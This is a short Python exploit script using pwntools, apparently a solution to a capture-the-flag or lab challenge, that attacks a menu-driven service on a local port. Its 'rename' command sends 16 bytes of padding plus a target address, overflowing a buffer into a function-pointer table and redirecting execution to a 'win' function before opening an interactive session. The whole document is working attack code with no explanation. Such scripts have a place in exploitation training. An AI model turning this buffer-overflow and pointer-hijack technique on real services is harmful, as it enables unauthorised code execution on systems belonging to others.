#!/usr/bin/env python3
# Overwrite s.ops[idx] by renaming with len > 16 so the write spills into the ops table.
from pwn import *
context.log_level="info"

HOST = os.environ.get("HOST","127.0.0.1")
PORT = int(os.environ.get("PORT","9106"))
WIN  = 0x4014a6  # update after build

p = remote(HOST, PORT)

# Target ops[1]
idx = 1
payload = b"A"*16 + p64(WIN)  # overwrite ops[1] pointer
p.sendlineafter(b"> ", b"rename")
p.sendlineafter(b" ", f"{idx} {len(payload)}".encode())
p.send(payload)

p.sendlineafter(b"> ", b"do")
p.sendlineafter(b" ", b"1")
p.interactive()
